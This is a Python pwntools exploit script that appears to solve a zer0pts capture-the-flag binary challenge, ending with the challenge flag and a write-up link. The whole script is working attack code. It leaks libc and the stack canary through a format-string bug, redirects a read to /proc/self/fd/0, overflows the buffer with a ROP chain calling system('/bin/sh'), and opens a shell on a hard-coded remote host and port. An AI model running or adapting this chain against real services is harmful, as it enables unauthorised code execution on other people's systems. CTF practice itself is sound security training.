from pwn import *


binpath = './chall'
elf = ELF(binpath)
libc = elf.libc


context.binary = elf
context.terminal = ['tmux', 'split-w', '-h']
context.log_level = 'DEBUG'


gdbscript = """
gef
# call fread
b *0x5555555551b9
# call fopen
b *0x55555555501a

ignore 1 1
ignore 2 3
c
"""
# io = gdb.debug([binpath], aslr=False, gdbscript=gdbscript)
# io = gdb.debug([binpath], aslr=False)
# io = process(binpath)
io = remote('18.179.178.246', 9008)


def open_book():
    io.sendlineafter(b'> ', b'1')


def open_lost_book():
    io.sendlineafter(b'> ', b'1')
    # data = io.recvuntil(b':').rstrip(b':')
    data = io.recvline()
    data = data[:data.rfind(b':')]
    return data


def read_book():
    io.sendlineafter(b'> ', b'2')
    io.recvline()
    data = io.recvuntil(b'*')
    io.recvline()
    return data


def edit_book(offset, data):
    io.sendlineafter(b'> ', b'3')
    io.sendlineafter(b'Offset: ', b'%d' % offset)
    io.sendafter(b'Text: ', data)


def fsb(fmt):
    payload = b''
    payload += p64(0)  # NULL out fp
    payload += p64(1)  # init
    payload += p64(0) * 2  # pad
    payload += fmt
    payload += b'\x00'
    edit_book(0x200, payload)
    return open_lost_book()


# Opening and reading from `/proc/self/fd/0` will make it to
# write from the attacket to the setin of the program.
# Becareful that this might not work with processes generated with gdb.debug.
def open_fd_0():
    payload = b''
    payload += p64(0)  # NULL out fp
    payload += p64(0)  # init
    payload += p64(0) * 2  # pad
    payload += b'/proc/self/fd/0\x00'
    edit_book(0x200, payload)
    open_book()

def read_fd_0(payload):
    print("read from stdin")
    # io.sendlineafter(b'> ', b'2')
    io.sendafter(b'> ', b'2\x00')
    io.send(payload)


open_book()
read_book()

addr_libc = int(fsb(b'%22$p\x00'), 16) - 0x21b97
print("addr_libc = 0x{:x}".format(addr_libc))

canary = int(fsb(b'%10$p\x00'), 16)
print('canary = 0x{:x}'.format(canary))

# input("Press enter to continue...")

open_fd_0()

pop_rdi = addr_libc + 0x000000000002155f
ret = addr_libc + 0x8aa

payload = b''
payload += b'A' * 0x208
payload += p64(canary)
payload += p64(0xdeadbeefcafebabe)
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(addr_libc + next(libc.search(b'/bin/sh')))
payload += p64(addr_libc + libc.symbols['system'])
payload += b'\x00' * (0x4000 - len(payload))

read_fd_0(payload)

io.interactive()


# https://hackmd.io/@ptr-yudai/rJBpRMzOr
# zer0pts{l0g1c4l_pwn_15_4_l0t_0f_fun}
